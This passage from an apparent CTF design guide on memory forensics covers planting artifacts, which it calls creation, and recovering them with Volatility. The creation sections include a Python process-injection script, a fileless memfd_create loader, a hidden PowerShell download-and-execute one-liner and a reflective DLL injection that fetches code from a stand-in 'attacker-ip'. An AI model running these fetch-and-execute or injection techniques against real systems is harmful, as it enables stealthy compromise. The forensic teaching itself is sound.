2. **Allocate:** Reserve a region of memory within the target process (`VirtualAllocEx`).
    
3. **Write:** Copy the malicious code or path to a DLL into that allocated memory (`WriteProcessMemory`).
    
4. **Execute:** Create a new thread within the target process to run the injected code (`CreateRemoteThread`).
    

**Key Constraints:**

- **Privileges:** The injector usually needs `SeDebugPrivilege` to open handles to system processes.
    
- **Architecture:** The injector and the target process must usually match architectures (x86 injecting into x86, x64 into x64).
    

#### 2. Practical Implementation (The "How-To")

**Perspective: The Architect (Creation)**

To create a CTF challenge involving memory injection, you need to run a script that injects a "flag" or a specific beacon pattern into a dummy process, and then immediately acquire a memory dump while that process is still running.

Below is a Python script using the `ctypes` library to interact with the Windows API. This script injects a benign "shellcode" (or a raw string acting as a flag) into a target process (e.g., Notepad).

**Step 1: The Injection Script (Python 3)**

Python

```
import ctypes
import sys
from ctypes import wintypes

# Windows API Constants
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40

# Define standard C types for the API calls
kernel32 = ctypes.windll.kernel32

def inject_code(pid, payload_data):
    """
    Injects raw bytes into the target process ID (PID).
    """
    print(f"[*] Opening target process: {pid}")
    
    # 1. OpenProcess
    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))
    if not h_process:
        print(f"[-] Could not obtain handle. Error Code: {kernel32.GetLastError()}")
        return

    print(f"[*] Allocating memory in PID {pid}")
    # 2. VirtualAllocEx
    # Allocate enough memory for the payload
    arg_address = kernel32.VirtualAllocEx(
        h_process, 
        0, 
        len(payload_data), 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE
    )

    print(f"[*] Writing payload to address: {hex(arg_address)}")
    # 3. WriteProcessMemory
    written = ctypes.c_int(0)
    kernel32.WriteProcessMemory(
        h_process, 
        arg_address, 
        payload_data, 
        len(payload_data), 
        ctypes.byref(written)
    )

    # Note: In a real malware scenario, we would call CreateRemoteThread here to EXECUTE it.
    # For a CTF forensics challenge, simply writing the "Flag" into the process memory
    # is often enough for the analyst to find it using `malfind` or string search.
    print("[+] Injection Complete. The data now resides in the target process RAM.")
    print("[*] DO NOT CLOSE THE TARGET PROCESS. TAKE MEMORY DUMP NOW.")
    
    # Clean up handle
    kernel32.CloseHandle(h_process)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <PID>")
        sys.exit(1)
    
    target_pid = sys.argv[1]
    
    # The Payload: This represents the CTF Flag hidden in code form
    # "CTF{GHO5T_1N_TH3_M4CH1N3}" encoded or just raw bytes
    flag_payload = b"CTF{GHO5T_1N_TH3_M4CH1N3}" + b"\x90" * 100 # Padding
    
    inject_code(target_pid, flag_payload)
```

**Step 2: Creating the Artifact**

1. Open a benign application (e.g., `notepad.exe`). Note its PID (e.g., `1234`).
    
2. Run the script: `python injector.py 1234`.
    
3. **Immediately** capture the RAM using a tool like **FTK Imager** or **DumpIt** while Notepad is still open.
    
4. The resulting `.mem` file is your challenge artifact.
    

#### 3. Example Scenario

Scenario Name: "The Phantom Note"

Narrative: The user reported their Notepad application acted briefly sluggish, but no files were saved. We suspect a fileless malware attack.

Challenge: Analyze memdump.raw. Find the process notepad.exe and identify the injected memory region.

Solution Path (for the solver): The solver uses Volatility's windows.malfind plugin. They detect a memory region in notepad.exe with PAGE_EXECUTE_READWRITE protections (unusual for data) and extract the content to find CTF{GHO5T_1N_TH3_M4CH1N3}.

#### 4. Key Tools

- **Metasploit Framework (`msfvenom`):** Used to generate realistic shellcode payloads (reverse shells, meterpreter) to inject if you want the challenge to be functionally malicious.
    
- **PowerSploit (`Invoke-DllInjection`):** A PowerShell framework that simplifies the injection of DLLs into processes, often used by attackers and usable by Architects to generate artifacts quickly.
    
- **DumpIt / FTK Imager:** Essential for acquiring the RAM dump after the injection is performed.

---

### Leaving artifacts in clipboard, command history, or environment variables

#### 1. Technical Theory

Volatile memory (RAM) acts as a temporary workspace for the operating system and active applications.

- **Clipboard:** A specialized buffer managed by the OS (e.g., `clip.exe` or OLE services in Windows, X selection in Linux) to store data for cut/copy/paste operations. This data remains in memory until overwritten or the system reboots.
    
- **Command History:** Shells (Bash, PowerShell, cmd) maintain a buffer of recently executed commands in the process memory. While `bash` writes to `.bash_history` on exit, the data exists in RAM while the session is active.
    
- **Environment Variables:** Key-value pairs accessible to processes. These are stored in the process environment block (PEB) in Windows or the stack/environment area in Linux. They are often used for temporary secrets (API keys, session tokens) to avoid writing them to disk.
    

#### 2. Practical Implementation (The "How-To")

Perspective: The Architect

To create a memory forensics challenge, you must interact with a live system to populate these buffers, and then immediately acquire a memory dump (e.g., using LiME or DumpIt) while the machine is running.

**A. Injecting into Clipboard**

- Windows (PowerShell):
    
    Use the built-in cmdlet to place the flag directly into the system clipboard.
    
    PowerShell
    
    ```
    Set-Clipboard -Value "flag{cl1pb0ard_w4rr10r}"
    # Verify contents
    Get-Clipboard
    ```
    
- Linux (Bash):
    
    Requires a clipboard utility (like xclip or xsel).
    
    Bash
    
    ```
    # Install if necessary: sudo apt install xclip
    echo "flag{linux_copy_paste_champion}" | xclip -selection clipboard
    ```
    

**B. Polluting Command History**

- Windows (PowerShell):
    
    Simply typing a command with the secret adds it to the history buffer.
    
    PowerShell
    
    ```
    # The Investigator will see this command string in the ConsoleHost_history objects
    $SecretFlag = "flag{p0wersh3ll_h1st0ry_le4k}"
    ```
    
- Linux (Bash):
    
    You can manipulate the history list programmatically without executing the command, or simply execute it.
    
    Bash
    
    ```
    # Method 1: Run a command with the flag (standard method)
    ./connect_server.sh --password "flag{b4sh_h1st0ry_reve4ls_all}"
    
    # Method 2: Inject into history without running (stealthier creation)
    history -s "openssl aes-256-cbc -d -in secret.enc -k flag{phantom_command}"
    ```
    

**C. Setting Environment Variables**

- Windows (PowerShell):
    
    Set a variable in the current process scope.
    
    PowerShell
    
    ```
    $env:AWS_SECRET_ACCESS_KEY = "flag{env_v4rs_ar3_n0t_s3cur3}"
    ```
    
- Linux (Bash):
    
    Export a variable so it resides in the shell's environment block.
    
    Bash
    
    ```
    export GITHUB_TOKEN="flag{exported_secrets_in_ram}"
    # Keep the shell open when taking the RAM dump!
    ```
    

D. Python Script for Automation

If building a complex scenario, use Python to populate multiple artifacts at once before dumping memory.

Python

```
import os
import pyperclip  # Requires: pip install pyperclip

def setup_memory_artifacts():
    # 1. Populate Environment Variable
    os.environ["CTF_TARGET_IP"] = "10.10.10.5"
    os.environ["CTF_AUTH_KEY"] = "flag{env_var_persists_in_process}"
    
    # 2. Populate Clipboard
    # Note: This usually requires a GUI session or X11 forwarding on Linux
    try:
        pyperclip.copy("flag{cl1pb0ard_buffer_data}")
        print("Clipboard populated.")
    except Exception as e:
        print(f"Clipboard failed (headless?): {e}")

    # 3. Keep process alive to ensure data stays in RAM
    print("Artifacts planted. Acquire memory dump now.")
    input("Press Enter to exit and clear memory...")

if __name__ == "__main__":
    setup_memory_artifacts()
```

#### 3. Example Scenario

Scenario: "The Copy-Paste Developer"

A developer was troubleshooting a production server connection. They copied the root password to their clipboard to paste it into a login prompt but forgot to clear it. Simultaneously, they exported an environment variable TEMP_API_KEY to test a script.

- **Challenge:** You are given a raw memory dump (`memdump.mem`) of the developer's workstation.
    
- **Flag Location:** The flag is split. Part 1 is in the Windows Clipboard format. Part 2 is inside the environment block of the `powershell.exe` process.
    

#### 4. Key Tools

- **PowerShell / Bash:** The primary interfaces for generating these artifacts natively.
    
- **xclip / xsel:** Linux command-line tools to interface with the X11 clipboard.
    
- **Pyperclip:** A cross-platform Python module for clipboard manipulation, useful for scripting challenge creation.

---

### Simulating "fileless" malware execution

#### 1. Technical Theory

"Fileless" malware (or Non-Malware) avoids writing malicious binaries to the disk to evade signature-based antivirus detection. Instead, it operates entirely within the computer's Random Access Memory (RAM) or leverages legitimate system tools (LOLBins - Living Off The Land Binaries).

- **Memory-Resident Execution:** The payload is injected directly into the address space of a running process (e.g., `explorer.exe` or `sshd`) or executed from a volatile memory file descriptor.
    
- **LOLBins:** Attackers use trusted, pre-installed tools like **PowerShell**, **WMI**, or **Bash** to fetch and execute code directly from memory.
    
- **Key Constraints:** Since the code resides only in RAM, persistence is difficult; a system reboot usually eradicates the active infection unless specific persistence mechanisms (like Registry keys or scheduled tasks) are established.
    

#### 2. Practical Implementation (The Architect)

To create a CTF challenge involving fileless malware, you must simulate the execution of code that leaves no file artifacts (e.g., `.exe` or `.elf`) on the disk.

A. Windows: PowerShell Reflective Injection

This method downloads a script or binary into memory and executes it without ever saving it to a file.

Option 1: The "Download & Execute" One-Liner (Basic)

This is the most common fileless technique. It fetches a script from a web server and passes it directly to the interpreter.

PowerShell

```
# The classic "Fileless" entry point
# -WindowStyle Hidden: Hides the terminal
# -Nop (NoProfile): Skips loading user profile (faster/stealthier)
# -Exec Bypass: Ignores execution policy
# IEX (Invoke-Expression): Runs the downloaded string as code
powershell.exe -WindowStyle Hidden -Nop -Exec Bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker-ip/payload.ps1')"
```

Option 2: Reflective DLL Injection (Advanced)

Use the PowerSploit framework to load a compiled DLL directly into the memory of another process (like notepad.exe).

PowerShell

```
# Pre-requisite: Load the PowerSploit module
Import-Module .\Invoke-ReflectivePEInjection.ps1

# Inject a DLL from a URL directly into a target process ID (e.g., Notepad)
$Url = "http://attacker-ip/malicious.dll"
$Bytes = (New-Object System.Net.WebClient).DownloadData($Url)
$TargetPid = (Get-Process notepad).Id

# The DLL never touches the disk; it moves from network -> memory -> target process
Invoke-ReflectivePEInjection -PEBytes $Bytes -ProcId $TargetPid
```

B. Linux: Anonymous Memory Execution (memfd_create)

On Linux, you can use the memfd_create syscall to create a file descriptor that exists only in RAM. You can write an ELF binary to this descriptor and execute it using fexecve.

**Python 3 Script to Simulate Linux Fileless Malware:**

Python

```
import os
import ctypes

# Define the binary payload (e.g., a simple "Hello World" ELF or reverse shell)
# In a real CTF, this would be your compiled flag checker or beacon.
elf_payload = b'\x7f\x45\x4c\x46...' # Truncated ELF header bytes

def run_fileless():
    # 1. Create an anonymous file in memory
    # MFD_CLOEXEC = 1
    # The name "malware_mem" will appear in /proc/pid/fd/ but NOT on disk
    mem_fd = os.memfd_create("malware_mem", 1)

    # 2. Write the ELF payload directly to this memory file descriptor
    os.write(mem_fd, elf_payload)

    # 3. Execute the memory content using fexecve
    # This replaces the current process with the in-memory ELF
    # The original script creates no file artifacts on disk.
    os.fexecve(mem_fd, ["/proc/self/fd/%d" % mem_fd], dict(os.environ))

if __name__ == "__main__":
    run_fileless()
```

#### 3. Example Scenario

Scenario: The Ghost Protocol

Participants are given a memory dump (image.mem) of a Linux server that was compromised.

- **The Setup:** A Python script (like the one above) ran a custom ELF binary named `[kworker/u4:0]` to masquerade as a kernel thread.
    
- **The Evidence:** There is no malicious binary in `/bin/` or `/tmp/`.
    
- **The Solution:**
    
    1. Running `linux_pslist` in Volatility shows a process named `[kworker/u4:0]` with a suspicious user-space PID (e.g., 4521).
        
    2. Running `linux_lsof` or `linux_proc_maps` reveals that the process executable maps to `/memfd:malware_mem` (or typical `memfd` artifacts) rather than a physical disk path.
        
    3. The flag is hardcoded within the `Code` segment of this injected process.
        

#### 4. Key Tools

- **PowerSploit (Invoke-ReflectivePEInjection):** A PowerShell framework containing modules for injection and persistence.
    
- **Metasploit Framework:** Specifically the `windows/manage/reflective_dll_inject` module for automated injection testing.
    
- **Cobalt Strike:** The industry standard for "Beacon" payloads which primarily use reflective DLL injection to evade detection.

## The Investigator (Solution)

### Profile identification and memory image verification

#### 1. Technical Theory

Memory forensics relies on overlaying data structures onto a raw dump of bytes. A **Profile** (in Volatility 2) or **Symbol Table** (in Volatility 3) acts as the map for this overlay. It defines the operating system version, architecture (x86/x64), and the offsets of critical kernel structures.

- **KDBG (Kernel Debugger Data Block):** In Windows, this structure contains pointers to the list of processes and loaded modules. Finding the KDBG is the primary method for verifying a profile matches a memory image.
    
- **DTB (Directory Table Base):** The physical address of the page directory. Identifying the correct DTB is crucial for translating virtual addresses to physical offsets.
    
- **Key Constraints:** If the profile is incorrect (e.g., using a Windows 7 SP0 profile on a Windows 7 SP1 image), pointers will be misaligned. Commands may return partial data, garbage characters, or crash entirely.
    

#### 2. Practical Implementation (The "How-To")

**Perspective: The Investigator**

A. Automated Identification (Volatility 2)

Volatility 2 requires the user to explicitly specify a profile. The imageinfo plugin scans the dump for KDBG signatures to suggest the best fit.

Bash

```
# Basic profile suggestion scan
python2 vol.py -f memory_dump.raw imageinfo

# Expected Output:
# Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64
# AS Layer1 : WindowsAMD64PagedMemory
# PAE type : No PAE
# DTB : 0x187000L
```

B. Precise Verification (Volatility 2)

imageinfo can be prone to false positives. Use kdbgscan for a more rigorous check. It validates the KDBG header signature and checks if the PsActiveProcessHead points to valid process structures.

Bash

```
python2 vol.py -f memory_dump.raw kdbgscan

# Look for the result with the highest number of "Processes Found"
# Profile: Win7SP1x64
# KDBG: 0xf8000280a0a0
# Processes (PsActiveProcessHead): 45  <-- High number confirms validity
```

C. Modern Identification (Volatility 3)

Volatility 3 automates profile detection using Symbol Tables (ISF). It downloads the necessary PDB files from Microsoft symbols servers automatically.

Bash

```
# Verify the image and identify OS details
python3 vol.py -f memory_dump.raw windows.info

# Output:
# Kernel Base: 0xf8064e000000
# DTB: 0x1ad000
# Symbols: file:///.../ntkrnlmp.pdb/D402...
```

D. Linux Profile Verification (Manual)

Linux does not have a standard KDBG. You verify a Linux image by checking the kernel banner string inside the raw data before attempting to build a profile.

Bash

```
# 1. Find the banner to identify kernel version
strings memory_dump.lime | grep "Linux version" | head -n 1

# Output: Linux version 5.4.0-42-generic ...

# 2. If creating a custom profile (Vol2), zip the dwarf file and System.map
# zip Ubuntu54.zip module.dwarf System.map
# mv Ubuntu54.zip volatility/plugins/overlays/linux/

# 3. Verify it works
python2 vol.py -f memory_dump.lime --profile=LinuxUbuntu54x64 linux_banner
```

#### 3. Example Scenario

Scenario: "The Doppelgänger"

Challenge: A memory dump infected.mem is provided. The prompt hints that the system is "an old Windows server."

Analysis:

1. Running `imageinfo` suggests both `Win2008R2SP0x64` and `Win7SP1x64`.
    
2. The investigator tries `Win7SP1x64` and runs `pslist`. The output shows processes but the names are garbled (e.g., `svcshost.exe` instead of `svchost.exe` is not visible, just random unicode).
    
3. **The Solve:** The investigator runs `kdbgscan`. They notice that the `Win7` profile shows 0 processes found, while `Win2008R2SP0x64` shows 52 processes.
    
4. Switching to `--profile=Win2008R2SP0x64` aligns the structures correctly, revealing a hidden malicious process `nc.exe` in the process list.
    

#### 4. Key Tools

- **Volatility 2:** The legacy standard; relies on explicit `--profile` flags.
    
- **Volatility 3:** The modern standard; uses automated symbol table handling and is significantly faster for Windows 10/11 images.
    
- **`strings`:** Essential for quick, "dirty" identification of OS versions (Linux banners, Windows paths) without parsing the full image.

---

### Memory anomaly and code injection detection (malfind, VAD analysis)

#### 1. Technical Theory

Process injection involves writing malicious code into the memory space of a legitimate process. In memory forensics, the key to detecting this is analyzing the **Virtual Address Descriptor (VAD)** tree and the memory regions themselves.

- **VAD Tree:** A data structure used by the Windows kernel to track allocated memory regions for a process. Each VAD entry details the region's start/end addresses, protection flags (e.g., Read/Write/Execute), and memory type (e.g., Private, Mapped).
    
- **Anomalies:** Injected shellcode or malware usually resides in memory regions with suspicious protection flags, specifically **PAGE_EXECUTE_READWRITE (ERW)** or **PAGE_EXECUTE_READ (ER)** protection, coupled with a memory type of **MEM_PRIVATE**. Legitimate data pages rarely require execute permission.
    
- **`malfind`:** A core Volatility plugin that scans VADs for executable memory regions lacking a backing file on disk or containing suspicious characteristics, often flagging injected code.
    

#### 2. Practical Implementation (The "How-To")

**Perspective: The Investigator (Solution)**

The goal is to systematically scan the memory dump for regions that exhibit the characteristics of injected code.

Step 1: Identifying Suspicious Regions (malfind)

Use the malfind plugin in Volatility 3 to automatically search for injected code. This tool looks for VAD entries with anomalous permissions and then performs a simple signature scan within the memory pages to search for known malicious shellcode patterns (like nop sleds or common API calls).

Bash

```
# Syntax: python3 vol.py -f <image> windows.malfind
python3 vol.py -f suspicious.mem windows.malfind
```

- **Output Analysis:** The output will list the **PID**, the **Virtual Address (VA)** of the suspicious region, the **Protection** flags (look for `RWX` or `RWE`), and a **Disassembly/Hex Dump** snippet showing the contents of that region. If the content is raw assembly or a long string of NOPs (`\x90`), it confirms injected code.
    

Step 2: VAD Analysis (vadinfo)

If malfind is too noisy or misses a cleverly injected section, you can perform a deeper VAD inspection on suspect processes (identified via pslist/psscan).

Bash

```
# Examine the VADs of a specific PID (e.g., 1234)
python3 vol.py -f suspicious.mem windows.vadinfo --pid 1234
```

- **Output Analysis:** Manually examine the `Protection` column for regions that are `EXECUTE_READWRITE` and confirm the `Type` is `MEM_PRIVATE`. This indicates dynamically allocated memory intended for execution, which is highly suspicious in non-compiler or non-JIT processes.
    

Step 3: Extracting the Payload

Once the suspicious Virtual Address (VA) is found via malfind or vadinfo, use the dumpfiles plugin to extract the raw payload bytes for static analysis.

Bash

```
# Dump the raw memory section starting at the VA found by malfind
python3 vol.py -f suspicious.mem -o /tmp/extracted_payload.bin windows.dumpfiles --virtaddr 0xDEADBEEF --pid 1234
```

- **Final Step:** Use `strings` on the extracted binary (`extracted_payload.bin`) to search for the flag or analyze it with a disassembler (like Ghidra or IDA Pro) to reverse-engineer the shellcode's function.
    

#### 3. Example Scenario

Scenario Name: "Sleeper Agent"

Narrative: The notepad.exe process on an endpoint started consuming unusual CPU resources before a system crash. The memory dump sleeper.mem was acquired.

Challenge: Locate the injected flag within the notepad.exe memory space.

Investigator Action:

1. Run `windows.malfind` on `sleeper.mem`.
    
2. The output flags a region in PID 4567 (`notepad.exe`) at address `0x15000000` with `PAGE_EXECUTE_READWRITE` protection.
    
3. The disassembly snippet shows a repeated ASCII string: `C T F { N O T E _ T H E _ I N J E C T I O N }`.
    
4. The investigator extracts the string or confirms the flag value directly from the `malfind` output.
    

#### 4. Key Tools

- **Volatility 3:** The essential framework for executing `malfind`, `vadinfo`, and `dumpfiles` against Windows memory dumps.
    
- **Ghidra / IDA Pro:** Used for static analysis and reverse engineering of the raw shellcode extracted from the memory region.
    
- **`strings`:** A simple command-line utility used to quickly search the extracted payload for human-readable text (the CTF flag).

---

### Process listing (pslist, pstree) and anomaly detection

#### 1. Technical Theory

In Windows memory forensics, the operating system tracks running processes using a specific data structure called `_EPROCESS`.

- **Doubly Linked List:** The OS maintains a circular doubly linked list of active processes (the `ActiveProcessLinks` list). Standard tools (like Task Manager or the API) walk this list to show running programs.
    
- **Pool Tag Scanning:** Even if a process is removed from this list (a technique called Direct Kernel Object Manipulation or DKOM), the `_EPROCESS` structure still resides in physical memory with a specific "Pool Tag" (usually `Proc` or `Epro` in older Windows).
    
- **Parent-Child Relationships:** Every process is spawned by another. Investigating the inheritance tree is critical for detecting anomalies (e.g., `cmd.exe` should not usually be spawned by `svchost.exe`).
    

#### 2. Practical Implementation (The "How-To")

**Perspective: The Investigator (Solution)**

The primary goal is to identify malware that is hiding itself or masquerading as a legitimate system process. We use **Volatility 3** for this analysis.

Step 1: Basic Enumeration (pslist)

Run pslist to see what the OS "admits" is running. This walks the ActiveProcessLinks list.

Bash

```
# Syntax: python3 vol.py -f <image> windows.pslist
python3 vol.py -f memory.dmp windows.pslist
```

Step 2: Finding Hidden Processes (psscan)

Run psscan to scan the memory dump for _EPROCESS pool tags. This ignores the linked list and finds artifacts directly in memory.

Bash

```
python3 vol.py -f memory.dmp windows.psscan
```

- **Analysis:** Compare the output of Step 1 and Step 2.
    
- **Detection:** If a PID appears in `psscan` but **not** in `pslist`, the malware has unlinked itself to hide. This is a high-confidence indicator of a rootkit or advanced malware.
    

Step 3: Analyzing Hierarchy (pstree)

Malware often names itself legitimately (e.g., svchost.exe) but runs from the wrong location or parent. Use pstree to visualize the lineage.

Bash

```
python3 vol.py -f memory.dmp windows.pstree
```

**Key Anomalies to look for in the Tree:**

- **`svchost.exe`:** Must carry a Parent PID (PPID) of `services.exe`. If `svchost.exe` is a child of `explorer.exe` or `iexplore.exe`, it is malicious.
    
- **`lsass.exe`:** Must be a child of `wininit.exe`.
    
- **`explorer.exe`:** Usually has no parent (orphaned) or is created by `userinit.exe`.
    

Step 4: Automated Anomaly Detection (Malprocfinder)

You can write a Python script to automate the comparison between pslist and psscan (known as "cross-view analysis").

Python

```
# Conceptual Python snippet for comparing PID sets
def detect_unlinked_processes(pslist_pids, psscan_pids):
    """
    Compares PIDs found via linked list vs pool scanning.
    """
    linked_set = set(pslist_pids)
    scanned_set = set(psscan_pids)
    
    # PIDs in scan but not in list are likely hidden (DKOM)
    hidden_procs = scanned_set - linked_set
    
    if hidden_procs:
        print(f"[!] ALERT: Hidden Processes Detected: {hidden_procs}")
    else:
        print("[*] No unlinked processes found.")
```

#### 3. Example Scenario

Scenario: "The Ghost in the Shell"

Description: A user reports their PC is slow. Standard Task Manager showed nothing unusual. You are given ghost.mem.

Investigator Action:

1. Run `windows.pslist`. You see PIDs 100, 104, 400...
    
2. Run `windows.psscan`. You see PIDs 100, 104, 400... and **PID 6666 (`notepad.exe`)**.
    
3. **Observation:** PID 6666 is missing from the `pslist` output but present in `psscan`.
    
4. **Conclusion:** The malware injected into `notepad.exe` and used DKOM to unlink the process from the OS list to avoid detection. The flag is likely in the memory space of PID 6666.
    

#### 4. Key Tools

- **Volatility 3:** The industry-standard framework written in Python 3 for analyzing memory dumps.
    
- **MemProcFS:** A tool that mounts memory dumps as a virtual file system, allowing you to browse processes as folders and view text files representing `pslist`/`pstree`.
    
- **Volatility 2 (Legacy):** Still widely used in CTFs; commands are similar (e.g., `vol.py -f image.mem --profile=Win7SP1x64 pslist`).

---

### Extracting command line history, clipboard data, and environment variables

#### 1. Technical Theory

When a user interacts with a system, the OS maintains various buffers in RAM to facilitate the user experience.

- **Console History:** In Windows, the `conhost.exe` (or `csrss.exe` in older versions) process manages the history of commands typed into `cmd.exe`. PowerShell manages its own history objects. In Linux, shells like `bash` store history in a heap buffer until the session closes.
    
- **Clipboard:** The OS allocates a shared memory segment or uses OLE (Object Linking and Embedding) channels to store data copied by the user. This data often resides in raw format or specific data structures (e.g., `_DATA_OBJECT` in Windows kernel memory).
    
- **Environment Variables:** Every process has a Process Environment Block (PEB) containing pointers to environment strings. These strings define the execution context (paths, usernames, temporary keys).
    

#### 2. Practical Implementation (The "How-To")

Perspective: The Investigator

The primary tool for this analysis is the Volatility Framework. Commands below are provided for Volatility 3 (current standard), with Volatility 2 equivalents noted where relevant.

A. Extracting Command Line History

This reveals commands typed by the user (e.g., net user, flag.exe).

- Windows (cmd.exe & PowerShell):
    
    Legacy console history (cmd.exe) is stored in conhost.exe.
    
    Bash
    
    ```
    # Volatility 3: Scan for console information
    python3 vol.py -f dump.mem windows.consoles
    
    # Volatility 3: Scan for command lines (arguments used to start processes)
    python3 vol.py -f dump.mem windows.cmdline
    ```
    
    _Volatility 2 equivalents:_ `cmdscan`, `consoles`.
    
- Linux (Bash History):
    
    Recovers history from the heap of bash processes.
    
    Bash
    
    ```
    # Volatility 3
    python3 vol.py -f dump.mem linux.bash
    ```
    
    _Volatility 2 equivalent:_ `linux_bash`.
    

B. Recovering Clipboard Data

Clipboard data is fleeting but often contains passwords or flags copied by the user immediately before the memory capture.

- **Windows:**
    
    Bash
    
    ```
    # Volatility 3 (Standard plugin)
    python3 vol.py -f dump.mem windows.clipboard
    
    # If the standard plugin fails, strings analysis near known clipboard headers might work:
    strings -e l dump.mem | grep -C 5 "flag{"
    ```
    
    _Volatility 2 equivalent:_ `clipboard`.
    

C. Inspecting Environment Variables

This is critical for finding API keys, session tokens, or flags stored in variables like CTF_FLAG or AWS_SECRET.

- Windows:
    
    You can dump variables for all processes or target a specific PID.
    
    Bash
    
    ```
    # Dump all environment variables
    python3 vol.py -f dump.mem windows.envars
    
    # Filter for a specific process (e.g., PowerShell with PID 1234)
    python3 vol.py -f dump.mem windows.envars --pid 1234
    ```
    
    _Volatility 2 equivalent:_ `envars`.
    
- **Linux:**
    
    Bash
    
    ```
    # Dump env vars for Linux processes
    python3 vol.py -f dump.mem linux.envars
    ```
    

#### 3. Example Scenario

Scenario: "The Stolen Session"

An administrator reported that their machine was compromised while they were performing maintenance. They suspect the attacker set a persistent backdoor using an environment variable and copied a secret key.

1. **Action:** You run `windows.cmdline` and see the admin ran `set_secret.exe`.
    
2. **Action:** You suspect the secret is in the environment. You run `windows.envars --pid <pid_of_cmd.exe>`.
    
3. **Result:** You find `SECRET_ACCESS_KEY=flag{m3m0ry_1s_v0lat1l3_but_h0n3st}`.
    
4. **Action:** You run `windows.clipboard`.
    
5. **Result:** You recover the string `https://attacker.com/payload.sh`, confirming the vector.
    

#### 4. Key Tools

- **Volatility 3:** The industry-standard framework written in Python 3 for analyzing volatile memory dumps.
    
- **MemProcFS:** A tool that mounts memory dumps as a virtual file system, allowing for easy browsing of processes, including their command lines and environment variables as text files.
    
- **Bulk Extractor:** Useful for carving strings (like URLs or email addresses) from memory dumps without parsing the OS structures, helpful if the memory image is corrupted.

---

### Dumping DLLs and executables from memory for analysis (Volatility, Rekall)

#### 1. Technical Theory

When an executable or DLL is loaded into memory, the Operating System's loader modifies the file structure significantly compared to its static state on the disk. This process is known as **mapping**.

- **Alignment Differences:** On disk, sections are aligned based on `FileAlignment` (often 512 bytes) to save space. In memory, they are aligned to `SectionAlignment` (often 4096 bytes/4KB) to match memory page boundaries.
    
- **Import Address Table (IAT) Resolution:** The loader overwrites the IAT with the actual virtual addresses of the imported functions for that specific boot session.
    
- **Unpacking:** Malware often exists as a packed/encrypted blob on the disk but must unpack itself into a clean, executable format in RAM to run. Dumping the memory image captures this "naked" payload, bypassing the packer.
    

#### 2. Practical Implementation (The Investigator)

The goal is to extract the mapped binary and, if necessary, reconstruct it so it can be analyzed by disassemblers (IDA Pro, Ghidra).

A. Volatility 2 (Classic Workflow)

Volatility 2 offers specific plugins for processes and DLLs.

- Dumping the Main Executable (procdump):
    
    Extracts the executable of a process. The --unsafe flag allows dumping even if the PE header is paged out or corrupted (common in malware).
    
    Bash
    
    ```
    # 1. Identify the suspicious Process ID (PID)
    python2 vol.py -f image.mem pslist
    
    # 2. Dump the executable for PID 1337 to the current directory
    # -u (--unsafe): Bypasses strict header checks
    python2 vol.py -f image.mem --profile=Win10x64 procdump -p 1337 --dump-dir=./extracted/ -u
    ```
    
- Dumping Loaded Modules (dlldump):
    
    Extracts specific DLLs or injected code modules loaded by a process.
    
    Bash
    
    ```
    # Dump all DLLs associated with PID 1337
    python2 vol.py -f image.mem --profile=Win10x64 dlldump -p 1337 --dump-dir=./extracted/
    
    # Dump a specific memory range (if malware injected code into a "hollowed" DLL)
    # -b: Base address of the specific DLL
    python2 vol.py -f image.mem --profile=Win10x64 dlldump -p 1337 -b 0x7ff12340000 --dump-dir=./extracted/
    ```
    

B. Volatility 3 (Modern Workflow)

Volatility 3 unifies file dumping under the dumpfiles plugin. It attempts to reconstruct files based on the VAD (Virtual Address Descriptor) tree.

Bash

```
# 1. List files associated with a specific PID to find the target
python3 vol.py -f image.mem windows.dumpfiles.DumpFiles --pid 1337

# 2. Use the physical offset (--phys) if you need a specific memory object
# This is often cleaner than dumping by PID if the process list is manipulated
python3 vol.py -f image.mem windows.dumpfiles.DumpFiles --phys 0x9e8b30
```

C. Post-Processing (Import Fixing)

A raw memory dump often cannot be executed or correctly analyzed because the Section offsets are still aligned to memory boundaries (Virtual Alignment), but analysis tools expect disk alignment.

- **Pe-bear / PE-sieve:** Open the dumped file. If the sections look misaligned, these tools can often "unmap" the PE (convert Virtual Size back to Raw Size) to make it readable.
    
- **Manual Fix (Python):** If headers are wiped, you may need to reconstruct the MZ/PE header manually before tools recognize it.
    

#### 3. Example Scenario

Scenario: The Polymorphic Packer

A company is hit by ransomware invoice.exe. Static analysis of the disk file fails because the file is heavily obfuscated and packed with a custom algorithm.

- **The Artifact:** A memory dump (`ram.raw`) taken while the ransomware was encrypting files.
    
- **Analysis:**
    
    1. `pslist` identifies `invoice.exe` at PID 404.
        
    2. `procdump -p 404` extracts the binary from RAM.
        
    3. Opening the dump in a hex editor reveals legible strings ("Encrypting your files...", "Send BTC to...") and clean assembly code.
        
    4. **Result:** The malware had to unpack itself in memory to execute. The dump bypassed the packer entirely, allowing the analyst to reverse-engineer the encryption key generation routine.
        

#### 4. Key Tools

- **Volatility (2 & 3):** The standard framework for memory extraction.
    
- **Rekall:** An alternative memory forensics framework (similar syntax to Volatility) often used for live forensics.
    
- **PE-Bear:** A robust GUI tool for viewing and modifying PE headers, essential for fixing "unmappable" memory dumps.

# Module 5: Disk Forensics & File Systems

## The Architect (Creation)

### Creating custom disk images (DD, E01).

#### 1. Technical Theory

Disk imaging is the process of creating a bit-for-bit replica of a physical storage device or a logical volume. For CTF Architects, this involves creating a "virtual" storage device that mimics a real hard drive or USB stick, containing a file system, file headers, and unallocated space where flags can be hidden.

**Image Formats:**

- **Raw (DD):** A flat, bit-stream copy of the data. It contains no metadata about the acquisition (case number, examiner, hash) and no compression. It is universally compatible with all analysis tools.
    
- **EnCase (E01):** The industry standard "Expert Witness Format." It wraps the raw data with headers (metadata), supports compression (to save space on large challenges), and includes embedded checksums (CRC/MD5) for integrity verification.
    

**Key Constraints:**

- **Size Management:** CTF challenges are often downloaded. A 500GB raw image is impractical. Architects usually create small loopback devices (e.g., 50MB - 500MB) to simulate a full disk while keeping file sizes manageable.
    
- **File System Choice:** The format (NTFS, EXT4, FAT32) dictates where the "slack space" and metadata reside.
    

#### 2. Practical Implementation (The "How-To")

